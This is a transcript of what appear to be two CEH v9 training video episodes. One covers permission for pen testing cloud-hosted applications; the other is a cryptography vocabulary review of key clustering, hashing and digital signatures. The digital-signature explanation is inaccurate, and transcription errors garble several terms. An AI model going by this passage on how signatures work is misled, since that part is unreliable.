00:36:24.160\nIf I wanna pen test that application,\n\n809\n00:36:24.160 --> 00:36:29.030\nam I getting permission from the company\nthat's the cloud service customer?\n\n810\n00:36:29.030 --> 00:36:32.000\nOr am I talking to\nthe cloud service provider?\n\n811\n00:36:32.000 --> 00:36:36.130\nAnd then I have to really make sure that I\ndon't go beyond that application because\n\n812\n00:36:36.130 --> 00:36:37.920\nthe infrastructure is not theirs.\n\n813\n00:36:37.920 --> 00:36:38.820\nDoes that makes sense?\n\n814\n00:36:38.820 --> 00:36:40.490\n>> Correct so and again this goes back.\n\n815\n00:36:40.490 --> 00:36:41.240\nIt's an excellent point.\n\n816\n00:36:41.240 --> 00:36:44.410\nIt goes back to one of the things we\ntalked about early on where I talked about\n\n817\n00:36:44.410 --> 00:36:46.350\nnegotiating the right you have or\n\n818\n00:36:46.350 --> 00:36:49.390\nrights you have on the platform with\nthe vendors who're going to host it.\n\n819\n00:36:49.390 --> 00:36:51.650\nSo you would to negotiate\na right to audit.\n\n820\n00:36:51.650 --> 00:36:55.560\nYou would have to negotiate a right to pen\ntest or right to vulnerability assess,\n\n821\n00:36:55.560 --> 00:36:58.560\nthe Cloud vendor may come back and\nsay, sorry, we do that ourselves.\n\n822\n00:36:58.560 --> 00:37:00.570\nWe're happy to share results with you but\n\n823\n00:37:00.570 --> 00:37:02.980\nwe're not gonna give you\nthe right to do that.\n\n824\n00:37:02.980 --> 00:37:06.775\nOr, under the right to audit you may\nget a limited right to pen test,\n\n825\n00:37:06.775 --> 00:37:10.225\nyour single tenant isolated systems\n>> Mm-hm.\n\n826\n00:37:10.225 --> 00:37:13.985\n>> Separately from the general\ninfrastructure at large, but\n\n827\n00:37:13.985 --> 00:37:16.795\nunder some very tightly\ncontrolled conditions.\n\n828\n00:37:16.795 --> 00:37:18.785\nIt really just depends, right?\n\n829\n00:37:18.785 --> 00:37:21.033\nBut In that model,\nin that case, you're right.\n\n830\n00:37:21.033 --> 00:37:25.449\nYou would have to go and you would have to\nactually work with the customer who should\n\n831\n00:37:25.449 --> 00:37:29.161\nhave negotiated the rights that they\nhave up front during the hosting\n\n832\n00:37:29.161 --> 00:37:31.997\nconversation to see whether or\nnot you can do that.\n\n833\n00:37:31.997 --> 00:37:34.707\nBecause if you're operating\non behalf of the customer,\n\n834\n00:37:34.707 --> 00:37:37.527\nyou don't have rights to do anything on\nthe vendor's platform unless the customer\n\n835\n00:37:37.527 --> 00:37:40.917\nhas that right already stipulated\nin a contractual agreement.\n\n836\n00:37:40.917 --> 00:37:43.390\nOtherwise, it's just plain and\nsimple, as I said, you're hacking.\n\n837\n00:37:43.390 --> 00:37:44.380\nThere's no grey area there.\n\n838\n00:37:44.380 --> 00:37:47.130\n>> The customers can't give you that\nright because they don't have it.\n\n839\n00:37:47.130 --> 00:37:48.900\n>> The customer cannot say to you,\nI'm gonna let you go.\n\n840\n00:37:48.900 --> 00:37:51.380\nYeah, salesforce.com, no problem.\n\n841\n00:37:51.380 --> 00:37:52.300\nYou wanna using it?\n\n842\n00:37:52.300 --> 00:37:53.620\nYou do whatever you want.\n\n843\n00:37:53.620 --> 00:37:54.360\nSorry, no.\n\n844\n00:37:54.360 --> 00:37:58.170\nThe judge will find you to have a problem\nwith that statement in court, and\n\n845\n00:37:58.170 --> 00:38:01.130\nyou better get your checkbook out\nif you wanna play that game, right?\n\n846\n00:38:01.130 --> 00:38:03.550\nBecause Sales Force is\nnot gonna like that, and\n\n847\n00:38:03.550 --> 00:38:04.910\nthey're not giving you permission.\n\n848\n00:38:04.910 --> 00:38:08.150\nAnd as you rightly pointed out they\nare the owner of the platform.\n\n849\n00:38:08.150 --> 00:38:09.440\n>> Right.\n>> And if you don't have their permission\n\n850\n00:38:09.440 --> 00:38:11.300\nyou're trespassing, plain and simple.\n\n851\n00:38:11.300 --> 00:38:12.460\nAnd we call that hacking.\n\n852\n00:38:12.460 --> 00:38:13.555\nWe don't call it ethical hacking.\n\n853\n00:38:13.555 --> 00:38:14.910\n>> [LAUGH]\n>> We call it hacking, right?\n\n854\n00:38:14.910 --> 00:38:16.710\nAnd that's what we call it and rightly so.\n\n855\n00:38:16.710 --> 00:38:20.440\nSo if you don't have rights from\nthe vendor on the platform and\n\n856\n00:38:20.440 --> 00:38:22.700\nthe owner of record you don't\nhave rights to be there.\n\n857\n00:38:22.700 --> 00:38:24.120\n>> Yeah that's right.\n\n858\n00:38:24.120 --> 00:38:24.740\nAll right, Adam.\n\n859\n00:38:24.740 --> 00:38:28.850\nGreat look there, kind of rounding out\nour discussions on cloud services,\n\n860\n00:38:28.850 --> 00:38:32.800\ntalking about some of the threats\nwe face as we consume or\n\n861\n00:38:32.800 --> 00:38:37.460\nuse these cloud provided services,\nas well as some of the counter measures.\n\n862\n00:38:37.460 --> 00:38:41.590\nAnd things that we've got to think about\nas we try to secure these said services.\n\n863\n00:38:41.590 --> 00:38:42.950\nSo we appreciate that Adam.\n\n864\n00:38:42.950 --> 00:38:44.640\nHope everybody out there enjoyed watching.\n\n865\n00:38:44.640 -->

00:00:16.774\nI'm here your host, Mike Roderick.\n\n4\n00:00:16.774 --> 00:00:21.569\nToday we're doing CEH version nine.\n\n5\n00:00:21.569 --> 00:00:26.059\nAnd specifically in this episode we're\ngonna avoid those creepy hands coming my\n\n6\n00:00:26.059 --> 00:00:29.910\nway and we're going to start into or\nget get into cryptography.\n\n7\n00:00:29.910 --> 00:00:33.420\nAnd as always first we're gonna start\nby getting that foundational knowledge,\n\n8\n00:00:33.420 --> 00:00:36.390\nmaking sure we're on the same\nplaying field, a lot of vocabulary,\n\n9\n00:00:36.390 --> 00:00:40.770\nsome terminology that we need to be able\nto understand or be familiar with so\n\n10\n00:00:40.770 --> 00:00:42.690\nwe can understand the concepts behind it.\n\n11\n00:00:42.690 --> 00:00:46.270\nAnd here to help us with that, of course,\nis the one and only Mr. Adam Gordon.\n\n12\n00:00:46.270 --> 00:00:47.260\nHow you doing Adam?\n\n13\n00:00:47.260 --> 00:00:49.800\n>> Very good,\nyou will now refer to me as primary key.\n\n14\n00:00:49.800 --> 00:00:50.360\n>> Primary key.\n\n15\n00:00:50.360 --> 00:00:52.540\n>> Primary key from now on,\nthat will be my new name.\n\n16\n00:00:52.540 --> 00:00:55.420\nSo hopefully everybody is well.\n\n17\n00:00:55.420 --> 00:00:56.660\nWe are gonna, as Mike said,\n\n18\n00:00:56.660 --> 00:00:59.490\nstart out a little bit different than\nwe have in some of our prior episodes.\n\n19\n00:00:59.490 --> 00:01:03.110\nWe are gonna lay down the foundational\nknowledge, as Mike discussed, but\n\n20\n00:01:03.110 --> 00:01:07.610\nwe're gonna do so by literally doing\nalmost an entire episode of vocabulary and\n\n21\n00:01:07.610 --> 00:01:08.930\nvocabulary review.\n\n22\n00:01:08.930 --> 00:01:13.870\nThere is so much we need to know, so many\nterms that we have to be operationally\n\n23\n00:01:13.870 --> 00:01:17.790\nefficient with and\nfamiliar with here to really be able to,\n\n24\n00:01:17.790 --> 00:01:22.130\nas an ethical hacker,\ntalk about operate within and\n\n25\n00:01:22.130 --> 00:01:26.720\nbe able to expound on our knowledge\nof cryptography with our customers,\n\n26\n00:01:26.720 --> 00:01:29.610\nwith those people that we do business\nwith, we work with and work for.\n\n27\n00:01:29.610 --> 00:01:32.680\nIn other words,\nto knowledgeably be able to execute\n\n28\n00:01:32.680 --> 00:01:37.640\nthe required activities in this area you\nmust understand the language of security.\n\n29\n00:01:37.640 --> 00:01:42.200\nAnd this is not exclusive to this area but\nit's one of those areas that I find\n\n30\n00:01:42.200 --> 00:01:45.390\nas I speak to people more and more, and\nMike, I don't know if you have an opinion\n\n31\n00:01:45.390 --> 00:01:49.540\nabout this just talking with students and\nall the people that we all work with.\n\n32\n00:01:49.540 --> 00:01:52.070\nBut it's one of those areas I\ntend to find that people don't\n\n33\n00:01:52.070 --> 00:01:56.940\nreally seem to know enough about or as\nmuch about as you would think they should.\n\n34\n00:01:56.940 --> 00:01:59.370\nAnd, unless you do this for a living,\n\n35\n00:01:59.370 --> 00:02:04.440\nmeaning specifically this cryptography,\nwe hear about things like key clustering.\n\n36\n00:02:04.440 --> 00:02:07.320\nWe hear about work space,\nwe hear about work factor,\n\n37\n00:02:07.320 --> 00:02:09.000\nwe hear about digital signatures.\n\n38\n00:02:09.000 --> 00:02:12.420\nWe hear about registration and\ncertificate authorities and PKI.\n\n39\n00:02:12.420 --> 00:02:14.020\nAnd we may think we know\na little bit about them,\n\n40\n00:02:14.020 --> 00:02:15.680\nbut how much do you really know?\n\n41\n00:02:15.680 --> 00:02:18.950\nAnd how much are you\nwilling to actually specify\n\n42\n00:02:18.950 --> 00:02:22.630\nyou're comfortable explaining to somebody\nand feel confident about that information.\n\n43\n00:02:22.630 --> 00:02:24.198\nThat's what we want to check on here.\n\n44\n00:02:24.198 --> 00:02:27.190\nAnd that's why we're gonna spend\nsome time helping you to figure out.\n\n45\n00:02:27.190 --> 00:02:31.350\nSo get out your Monopoly money, we're\ngonna start betting, first one Mike misses\n\n46\n00:02:31.350 --> 00:02:36.150\nby the way, he gets to run around, he has\nto do a lap for every one he misses here.\n\n47\n00:02:36.150 --> 00:02:38.626\nCuz we can't do drinking on air,\nthat would be inappropriate and\n\n48\n00:02:38.626 --> 00:02:41.155\nMike doesn't have a liver that\nwould survive if we had to do that.\n\n49\n00:02:41.155 --> 00:02:42.809\n>> [LAUGH]\n>> So\n\n50\n00:02:42.809 --> 00:02:46.850\nwe actually are gonna just simply do\na quick run through on the vocabulary.\n\n51\n00:02:46.850 --> 00:02:48.330\nMike has volunteered to help me.\n\n52\n00:02:48.330 --> 00:02:49.480\nHe's gonna do the driving here.\n\n53\n00:02:49.480 --> 00:02:51.920\nWe got a nice vocabulary list\nwe put together for you.\n\n54\n00:02:51.920 --> 00:02:54.511\nI assume we'll make this available to\nthe nice people out there in ITProTV land.\n\n55\n00:02:54.511 --> 00:02:56.290\n>> We will, absolutely.\n\n56\n00:02:56.290 --> 00:02:59.110\n>> So you're gonna get a list of\nvocabulary terms we're gonna define\n\n57\n00:02:59.110 --> 00:03:00.030\nfor you here.\n\n58\n00:03:00.030 --> 00:03:01.290\nIt'll be a great way for you to go and\n\n59\n00:03:01.290 --> 00:03:05.490\ndo a little studying based on some of\nthe things we've already talked about and\n\n60\n00:03:05.490 --> 00:03:08.840\ncertainly recommendations that\nwe all know will be valuable.\n\n61\n00:03:08.840 --> 00:03:11.730\nMight wanna think about making some\nflash cards and perhaps going out and\n\n62\n00:03:11.730 --> 00:03:15.660\ndoing a little vocab review/preview,\n\n63\n00:03:15.660 --> 00:03:18.230\nwith regards to the exam and\nmake sure that you're comfortable with it.\n\n64\n00:03:18.230 --> 00:03:20.550\nSo, let's dive right in.\n\n65\n00:03:20.550 --> 00:03:21.670\nLet's start at the top.\n\n66\n00:03:21.670 --> 00:03:25.140\nWe're going to spread our discussion\nacross the entire breadth and\n\n67\n00:03:25.140 --> 00:03:27.650\ndepth of the cryptography discussion.\n\n68\n00:03:27.650 --> 00:03:29.450\nMeaning, we're not going\nto break it down and\n\n69\n00:03:29.450 --> 00:03:33.792\njust focus on PKI, not break it down and\njust focus on hashing.\n\n70\n00:03:33.792 --> 00:03:35.290\nI'm gonna talk about everything and\n\n71\n00:03:35.290 --> 00:03:38.700\nanything you could possibly\nimagine that goes into this topic.\n\n72\n00:03:38.700 --> 00:03:41.320\nWe've got close to 30 terms that\nwe're gonna go through with you.\n\n73\n00:03:41.320 --> 00:03:45.520\nWhen we're done, you're gonna know all the\nvocabulary, and then in upcoming episodes,\n\n74\n00:03:45.520 --> 00:03:47.860\nwe're gonna go back and\nstart picking and choosing, and\n\n75\n00:03:47.860 --> 00:03:51.520\napplying that knowledge across the board,\nif you will.\n\n76\n00:03:51.520 --> 00:03:55.300\nSo hang on, it's gonna be a bumpy ride,\nbut boy are we gonna have fun.\n\n77\n00:03:55.300 --> 00:03:58.230\n>> Keep your hands and\nfeet in the car at all times.\n\n78\n00:03:58.230 --> 00:04:00.270\nThe ride will not stop,\njust so we're clear.\n\n79\n00:04:00.270 --> 00:04:01.740\nAll right, so let's continue on here.\n\n80\n00:04:01.740 --> 00:04:03.690\nSo let's start with key\nclustering up at the top.\n\n81\n00:04:03.690 --> 00:04:07.730\nSo, the idea of key clustering is the idea\nthat different encryption keys, and\n\n82\n00:04:07.730 --> 00:04:09.610\nwe'll talk about what those keys are.\n\n83\n00:04:09.610 --> 00:04:14.260\nWhether they're public or public and\nprivate in a key pair, together or\n\n84\n00:04:14.260 --> 00:04:17.200\njust half of that key pair or\nwhether they are private,\n\n85\n00:04:17.200 --> 00:04:21.920\nexclusive to a traditional model that we\ntalk about, where we talk about whether it\n\n86\n00:04:21.920 --> 00:04:27.245\nis going to be a symmetric or\nasymmetric system.\n\n87\n00:04:27.245 --> 00:04:30.780\nAnd we'll talk about that and define all\nthat coming up, but we wanna know that\n\n88\n00:04:30.780 --> 00:04:34.790\nthose encryption keys, if they\nare different encryption keys, and they\n\n89\n00:04:34.790 --> 00:04:39.350\ngenerate the same cipher text from the\nsame plaintext message, that's a problem.\n\n90\n00:04:39.350 --> 00:04:40.770\nWe call that a key cluster.\n\n91\n00:04:40.770 --> 00:04:42.310\nWe can just generally call that a cluster.\n\n92\n00:04:42.310 --> 00:04:42.880\n>> A cluster, yeah.\n[LAUGH]\n\n93\n00:04:42.880 --> 00:04:44.270\n>> In general, it's kind of,\n\n94\n00:04:44.270 --> 00:04:46.870\nexplain an propagate\nthe same information and\n\n95\n00:04:46.870 --> 00:04:49.650\nsame meaning, but a little bit more\ncolorfully in certain circles,\n\n96\n00:04:49.650 --> 00:04:53.040\ndepending on where you grow up,\nand where you may be coming from.\n\n97\n00:04:53.040 --> 00:04:56.490\nBut generically, key clustering, if you\nremember in one of the prior episodes,\n\n98\n00:04:56.490 --> 00:04:59.860\nI talked about the fact\nthat any kind of pattern,\n\n99\n00:04:59.860 --> 00:05:04.090\nany kind of sameness with\nregards to cryptography and\n\n100\n00:05:04.090 --> 00:05:09.100\ncryptographic operations is devastating\nto our ability to provide security.\n\n101\n00:05:09.100 --> 00:05:10.370\nIt is a good indicator for\n\n102\n00:05:10.370 --> 00:05:14.030\nbad actors, that there's\nan opportunity to exploit a weakness.\n\n103\n00:05:14.030 --> 00:05:16.020\nAnd all they have to do\nis work hard to find it.\n\n104\n00:05:16.020 --> 00:05:19.790\nSo we never wanna have a repetition event,\nwe never wanna have sameness.\n\n105\n00:05:19.790 --> 00:05:24.130\nWe never wanna have a pattern that\nwe can discern, very important for\n\n106\n00:05:24.130 --> 00:05:25.770\nyou to think about that.\n\n107\n00:05:25.770 --> 00:05:28.820\nSo key clustering is\nthe issue that we identify,\n\n108\n00:05:28.820 --> 00:05:32.840\nwhen different keys are generating\nthe same ciphertext,\n\n109\n00:05:32.840 --> 00:05:38.360\nthe same encrypted text, from the same\norigination, the same plaintext message.\n\n110\n00:05:38.360 --> 00:05:42.910\nJerry likes ice cream,\ngets encrypted by different keys and\n\n111\n00:05:42.910 --> 00:05:47.050\nwe get the same ciphertext out\nthe back end for both operations.\n\n112\n00:05:47.050 --> 00:05:50.100\nThat's a key cluster, that's a bad thing.\n\n113\n00:05:50.100 --> 00:05:53.670\nWe have to go out and tell Jerry he now\nlikes iced tea instead of ice cream.\n\n114\n00:05:53.670 --> 00:05:56.370\nCuz he can't do that or\nshe can't do that anymore.\n\n115\n00:05:56.370 --> 00:05:57.390\nAll right, so key clustering.\n\n116\n00:05:57.390 --> 00:05:59.370\nSynchronous and asynchronous.\n\n117\n00:05:59.370 --> 00:06:02.250\nNot to be confused with\n[COUGH] asymmetric and\n\n118\n00:06:02.250 --> 00:06:05.220\nsymmetric, as I've been known\nto do on rare occasions.\n\n119\n00:06:05.220 --> 00:06:08.330\nI know Mike was holding his breath when\nI was about to start explaining that.\n\n120\n00:06:08.330 --> 00:06:11.940\nThat was one of the famous bloopers\non the blooper reel you haven't seen\n\n121\n00:06:11.940 --> 00:06:14.150\nwhere I launched into\nan entire conversation.\n\n122\n00:06:14.150 --> 00:06:16.100\nAnd then we backed up and\nsaid, but wait a second,\n\n123\n00:06:16.100 --> 00:06:19.040\nisn't that the exact opposite\nof what you're talking about.\n\n124\n00:06:19.040 --> 00:06:20.180\nBut it was a good conversation.\n\n125\n00:06:20.180 --> 00:06:21.170\n>> It was a great conversation.\n\n126\n00:06:21.170 --> 00:06:24.450\n>> I was going on full throttle like I\nactually knew what I was talking about.\n\n127\n00:06:24.450 --> 00:06:26.960\nThat was after the end of like\na 12 hour day of shooting though,\n\n128\n00:06:26.960 --> 00:06:29.980\nso I was a little bit punchy and\njust not quite there.\n\n129\n00:06:29.980 --> 00:06:32.220\nAll right, but let's talk about\nsynchronous and asynchronous.\n\n130\n00:06:32.220 --> 00:06:36.930\nSo the idea here was synchronous as\nyou can see, encryption or decryption,\n\n131\n00:06:36.930 --> 00:06:38.930\neither one, either activity,\ndoesn't matter.\n\n132\n00:06:38.930 --> 00:06:41.120\nRequest is gonna be performed immediately.\n\n133\n00:06:41.120 --> 00:06:43.870\nSynchronously, think of\nsynchronous like stream.\n\n134\n00:06:43.870 --> 00:06:48.250\nWe're propagating, we're processing in\nreal time as things come in all the time.\n\n135\n00:06:48.250 --> 00:06:51.150\nNothing waits, we just get to it\nright away and we're just gonna\n\n136\n00:06:51.150 --> 00:06:54.870\ngo through those requests and knock them\ndown as they come in, that's synchronous.\n\n137\n00:06:54.870 --> 00:06:56.950\nAnything that's synchronous is that way,\nin real time.\n\n138\n00:06:56.950 --> 00:06:59.490\nIn other words, asynchronous,\nagain encrypt or\n\n139\n00:06:59.490 --> 00:07:02.035\ndecrypt, requests are processed in queues.\n\n140\n00:07:02.035 --> 00:07:05.510\nMeaning, we line them up and then\nwe're gonna get to them over time, but\n\n141\n00:07:05.510 --> 00:07:08.290\nwe're gonna have to say, hey,\nyou're number five, you're number six,\n\n142\n00:07:08.290 --> 00:07:11.070\nyou're number seven, and\nright now, we're on number two.\n\n143\n00:07:11.070 --> 00:07:16.570\nIt's kind of the step up to the counter\nand wait, take the number and wait thing.\n\n144\n00:07:16.570 --> 00:07:19.320\nSo, we wanna know the difference\nthere between synchronous and\n\n145\n00:07:19.320 --> 00:07:23.610\nasynchronous our activities,\nbecause clearly synchronous encryption or\n\n146\n00:07:23.610 --> 00:07:25.835\ndecryption is gonna be\nperformed a lot faster.\n\n147\n00:07:25.835 --> 00:07:26.450\n>> Mm-hm.\n\n148\n00:07:26.450 --> 00:07:29.630\n>> Asynchronous encryption and\ndecryption is gonna be slower and\n\n149\n00:07:29.630 --> 00:07:34.300\nwe have to take that into account as we're\nscaling our systems and figuring out what\n\n150\n00:07:34.300 --> 00:07:38.778\nkind of response times, and what kind of\nvalue we ultimately are looking for there.\n\n151\n00:07:38.778 --> 00:07:39.448\nHash functions,\n\n152\n00:07:39.448 --> 00:07:42.900\nwe've talked about hash functions before,\nMike's been kind enough to demo this for\n\n153\n00:07:42.900 --> 00:07:47.230\nus once or twice, and we'll take a look at\nit again when we do our demonstrations and\n\n154\n00:07:47.230 --> 00:07:50.760\nlab piece here, at one of the upcoming\nepisodes for cryptography.\n\n155\n00:07:50.760 --> 00:07:54.640\nBut the ideas generically that we're gonna\ntake a one way mathematical operation as\n\n156\n00:07:54.640 --> 00:07:56.700\nyou can see there, reducing a message or\n\n157\n00:07:56.700 --> 00:08:00.460\na data file into a smaller,\nfixed length output, or hash value.\n\n158\n00:08:00.460 --> 00:08:01.296\nWho wrote that explanation?\n\n159\n00:08:01.296 --> 00:08:04.039\n>> [LAUGH]\n>> That's like, ridiculously wordy.\n\n160\n00:08:04.039 --> 00:08:06.969\nNobody talks like that,\nnot even me, and I wrote it.\n\n161\n00:08:06.969 --> 00:08:09.480\nLet's talk about that from\nthe perspective of breaking that down.\n\n162\n00:08:09.480 --> 00:08:11.617\nCan we actually add a line in there\nreal quick before we go to the next one?\n\n163\n00:08:11.617 --> 00:08:12.658\n>> Absolutely, mm-hm.\n\n164\n00:08:12.658 --> 00:08:15.760\n>> So let's put something up there real\nquick, just hit, Enter twice, just so\n\n165\n00:08:15.760 --> 00:08:17.060\nwe can make a little room.\n\n166\n00:08:17.060 --> 00:08:21.610\nSo let's put up essentially what\nthe hashing function or hash,\n\n167\n00:08:23.180 --> 00:08:28.210\nlet's call it the hashing\nformula is gonna be just\n\n168\n00:08:28.210 --> 00:08:30.710\na little formula to help us\nremember what a hash function is.\n\n169\n00:08:30.710 --> 00:08:32.480\nSo variable size input.\n\n170\n00:08:33.850 --> 00:08:37.974\nVariable input, or variable size input,\nplus, hashing algorithm.\n\n171\n00:08:40.877 --> 00:08:45.760\nEquals, yeah,\nnot unless we're in Ancient Greece.\n\n172\n00:08:45.760 --> 00:08:51.270\nSo if you smell that the way we\nsmell it normally, O-R-I-T-H-M.\n\n173\n00:08:51.270 --> 00:08:56.420\nGod, can I get somebody who can\nactually type to help me here?\n\n174\n00:08:56.420 --> 00:08:57.789\nIs Nate doing anything right now?\n\n175\n00:08:57.789 --> 00:08:58.362\nCan you ask him to come in here?\n\n176\n00:08:58.362 --> 00:08:59.361\n>> [LAUGH] I don't know, let me go check.\n\n177\n00:08:59.361 --> 00:09:00.929\n[LAUGH]\n>> Can we get him to come in and\n\n178\n00:09:00.929 --> 00:09:01.630\nhelp us out?\n\n179\n00:09:01.630 --> 00:09:03.930\nNobody spells algorithm like that.\n\n180\n00:09:03.930 --> 00:09:06.232\nNot even the Greeks spell\nalgorithm like that.\n\n181\n00:09:06.232 --> 00:09:14.540\nAll right, variable size input plus\nhashing algorithm equals fixed bit output.\n\n182\n00:09:14.540 --> 00:09:15.940\nFixed bit output, or\n\n183\n00:09:15.940 --> 00:09:19.200\nfixed stream output or whatever you\nwant to call it, but fixed bit output.\n\n184\n00:09:19.200 --> 00:09:23.970\nThe idea is essentially, if we think about\nhow this works, we can take any kind of\n\n185\n00:09:23.970 --> 00:09:27.170\ndata of any size, it doesn't matter what\nit is, you didn't believe me did you?\n\n186\n00:09:27.170 --> 00:09:29.095\nYou had to go check,\nyou didn't believe me right?\n\n187\n00:09:29.095 --> 00:09:31.890\n>> [LAUGH]\n>> All right, variable size input,\n\n188\n00:09:31.890 --> 00:09:34.370\nsize of any data it does not matter what.\n\n189\n00:09:34.370 --> 00:09:36.720\nIt could be a single\ncharacter the letter t,\n\n190\n00:09:36.720 --> 00:09:41.260\nit could be all of the written\nknowledge of humanity for all time.\n\n191\n00:09:41.260 --> 00:09:42.350\nDoesn't matter.\n\n192\n00:09:42.350 --> 00:09:44.830\nWe're gonna run it through\na hashing algorithm using\n\n193\n00:09:44.830 --> 00:09:47.420\nsome sort of software that\nallows us to do this, right?\n\n194\n00:09:47.420 --> 00:09:50.680\nHash Calc or that website you have or\nwhatever it is.\n\n195\n00:09:50.680 --> 00:09:56.040\nWe're gonna choose the appropriate\nalgorithm, MD5, Sha-1, Ripe MD 160,\n\n196\n00:09:56.040 --> 00:10:01.130\nCRC 32, there's a whole bunch of\ndifferent algorithms out there.\n\n197\n00:10:01.130 --> 00:10:04.760\nEach one is gonna output the stream\n\n198\n00:10:04.760 --> 00:10:09.240\nof data that comes out the back end which\nis the hash stream or the message digest,\n\n199\n00:10:09.240 --> 00:10:11.620\nif we're thinking about\ndoing digital signatures for\n\n200\n00:10:11.620 --> 00:10:16.655\nhashing, but whatever it is, the output is\nIs gonna be of a fixed stream output size.\n\n201\n00:10:16.655 --> 00:10:21.695\nWe know that a certain number of bits\nare gonna be outputted by md5, right?\n\n202\n00:10:21.695 --> 00:10:22.295\nIt's gonna be 128 bits.\n\n203\n00:10:22.295 --> 00:10:23.295\n>> Right.\n\n204\n00:10:23.295 --> 00:10:28.575\n>> We know that s our shy one short for\nshy 160 is gonna output 160 bits.\n\n205\n00:10:28.575 --> 00:10:32.900\nWe know ripe Md 160 puts out 160 bits.\n\n206\n00:10:32.900 --> 00:10:36.380\nSo it is the fact that we get\nfixed output on the back end,\n\n207\n00:10:36.380 --> 00:10:38.630\nright, is what we have to think about.\n\n208\n00:10:38.630 --> 00:10:41.930\nSo the input is variable,\nbut the output is fixed and\n\n209\n00:10:41.930 --> 00:10:44.830\nthat's really what's important,\nwant to make sure we know that.\n\n210\n00:10:44.830 --> 00:10:49.660\nSo when we strip down and just reduce down\nthe hash function, what we really want to\n\n211\n00:10:49.660 --> 00:10:54.730\nknow Is that this is the operational\nway in which caching actually works.\n\n212\n00:10:54.730 --> 00:10:58.750\nNow what's important also,\nis to understand that, a,\n\n213\n00:10:58.750 --> 00:11:01.470\nwe do have fixed output lengths for\ncertain algorithms.\n\n214\n00:11:01.470 --> 00:11:02.820\nSo have two or three of them.\n\n215\n00:11:02.820 --> 00:11:04.380\nWe'll make sure you know what they are.\n\n216\n00:11:04.380 --> 00:11:05.590\nBut in addition,\n\n217\n00:11:05.590 --> 00:11:10.670\nto know that we are providing integrity\nwith hashing not confidentiality.\n\n218\n00:11:10.670 --> 00:11:15.280\nMeaning we are not keeping data secure\naway from unauthorized users by encrypting\n\n219\n00:11:15.280 --> 00:11:17.085\nit, hiding its meaning.\n\n220\n00:11:17.085 --> 00:11:21.515\nWe do that with algorithms but other kinds\nof algorithms, not hashing algorithms, but\n\n221\n00:11:21.515 --> 00:11:23.045\nencryption algorithms.\n\n222\n00:11:23.045 --> 00:11:26.465\nHashing algorithms do one thing and\none thing only, but they do it very well.\n\n223\n00:11:26.465 --> 00:11:29.865\nThey provide an integrity check,\nvalidating\n\n224\n00:11:29.865 --> 00:11:33.337\nthat the data It is not modified in any\nway, at least not without our knowledge or\n\n225\n00:11:33.337 --> 00:11:35.927\nconsent and\nobviously our understanding, right?\n\n226\n00:11:35.927 --> 00:11:37.627\nJust want to make sure\nwe're aware of that.\n\n227\n00:11:37.627 --> 00:11:39.087\nAll right, so that's the hashing function.\n\n228\n00:11:39.087 --> 00:11:40.297\nVery good, sir.\n\n229\n00:11:40.297 --> 00:11:43.377\nMake a mental note,\nno more off the cuff typing for Mike.\n\n230\n00:11:43.377 --> 00:11:45.220\n>> [LAUGH]\n>> All right, Digital signatures.\n\n231\n00:11:45.220 --> 00:11:46.000\nWhat are we doing here?\n\n232\n00:11:46.000 --> 00:11:48.210\nWe just talked about essentially\nwhat a hash function is,\n\n233\n00:11:48.210 --> 00:11:52.310\nand apply that to digital signatures,\nwe are going to allow for\n\n234\n00:11:52.310 --> 00:11:57.580\nthe use of an integrity validation\nsituation to arise here.\n\n235\n00:11:57.580 --> 00:12:02.860\nWhere we are going to use a private key,\nspecifically the private key of the sender\n\n236\n00:12:02.860 --> 00:12:08.730\nto be able to sign, to represent their\nidentity uniquely on this email message,\n\n237\n00:12:08.730 --> 00:12:11.730\nbecause we have an operational rule that\nwe have to think about before we fully\n\n238\n00:12:11.730 --> 00:12:15.250\nexplain digital signatures,\nwhich is in cryptography.\n\n239\n00:12:15.250 --> 00:12:19.460\nWe have to know that the operational rule,\nthe operational mechanism.\n\n240\n00:12:19.460 --> 00:12:21.739\nWe always have to be thinking about them,\nand be aware of,\n\n241\n00:12:21.739 --> 00:12:24.210\nis private keys must be kept secure.\n\n242\n00:12:24.210 --> 00:12:26.610\nMeaning essentially,\nwe never expose the private key,\n\n243\n00:12:26.610 --> 00:12:29.490\nat least we try to avoid doing\nthat if at all possible, right?\n\n244\n00:12:30.680 --> 00:12:34.310\nNow, people often don't understand\nthat digital signatures don't expose\n\n245\n00:12:34.310 --> 00:12:34.970\nthe private key.\n\n246\n00:12:34.970 --> 00:12:38.440\nWe tell people, the sender is\ngonna sign with their private key.\n\n247\n00:12:38.440 --> 00:12:41.630\nWell, they think, okay like I sign\na piece of paper and I'm gonna send that,\n\n248\n00:12:41.630 --> 00:12:44.480\npeople can read my signature,\nthey can read my private key.\n\n249\n00:12:44.480 --> 00:12:48.680\nNo, we're gonna set a cryptographic\nrepresentation of the private key.\n\n250\n00:12:48.680 --> 00:12:52.770\nSo we're gonna combine the private\nkey with some other information.\n\n251\n00:12:52.770 --> 00:12:54.840\nWe're gonna cryptographically\nrepresent that as a hash,\n\n252\n00:12:54.840 --> 00:12:56.470\nwe just talked about hashing, right?\n\n253\n00:12:56.470 --> 00:12:58.670\nAnd then what's gonna\nhappen after that is,\n\n254\n00:12:58.670 --> 00:13:02.520\nwe are then going to be able\nto send that information, and\n\n255\n00:13:02.520 --> 00:13:07.840\nthen the only way that can be validated is\nwe are using what's known as a key pair.\n\n256\n00:13:07.840 --> 00:13:09.920\nSo we're gonna use\na public private key pair.\n\n257\n00:13:10.940 --> 00:13:14.180\nAsymmetric encryption,\nkrypton uses two keys.\n\n258\n00:13:14.180 --> 00:13:17.960\nWhen we sign with our digital\nSignature with our private key.\n\n259\n00:13:17.960 --> 00:13:20.870\nThe only key that could be used to\nvalidate the authenticity of that private\n\n260\n00:13:20.870 --> 00:13:23.360\nkey is the matching public key pair.\n\n261\n00:13:23.360 --> 00:13:26.590\nPublic key is available anywhere\nwithin the system traditionally.\n\n262\n00:13:26.590 --> 00:13:29.700\nUsually stored in the ldap directory,\nmade available through web service.\n\n263\n00:13:29.700 --> 00:13:31.920\nVariety of different\nways we distribute that.\n\n264\n00:13:31.920 --> 00:13:34.620\nWe take that corresponding key pair.\n\n265\n00:13:34.620 --> 00:13:38.270\nWe run it against the private key\nto generate a hash to validate it.\n\n266\n00:13:38.270 --> 00:13:40.670\nIf the two match,\nwe know the signature is legitimate.\n\n267\n00:13:40.670 --> 00:13:44.430\nThe goal of digital signatures\nis to provide non-repdudiation,\n\n268\n00:13:44.430 --> 00:13:46.035\nproof of origin, right?\n\n269\n00:13:46.035 --> 00:13:47.220\n>> Mm-hm.\n>> Who signed it.\n\n270\n00:13:47.220 --> 